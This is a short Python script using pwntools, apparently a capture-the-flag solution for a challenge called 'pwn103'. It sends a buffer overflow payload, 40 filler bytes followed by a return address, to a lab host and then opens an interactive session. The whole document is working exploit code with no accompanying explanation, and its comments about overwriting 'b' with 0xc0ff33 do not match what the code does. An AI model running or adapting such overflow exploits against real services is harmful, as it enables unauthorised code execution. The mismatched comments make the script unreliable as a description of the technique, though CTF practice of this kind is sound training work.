from pwn import *

# Create the payload
payload = b"A" * 40  # Fill the buffer
payload += p64(0x401554)  # Overwrite 'b' with 0xc0ff33
payload += p64(0x401554)  # Overwrite 'b' with 0xc0ff33

try:
    # Attempt to connect to the remote host
    target = remote('10.10.71.252', 9003)
    #target = process('./pwn103')
    
    # Send initial input to move to the desired function
    target.sendline('3')  # Move to function general
    
    # Receive until the specific line
    #target.recvuntil('------[pwner]:')
    
    # Send the payload
    target.sendline(payload)
    
    # Interact with the process to see the results
    target.interactive()
except PwnlibException as e:
    print(f"Connection failed: {e}")
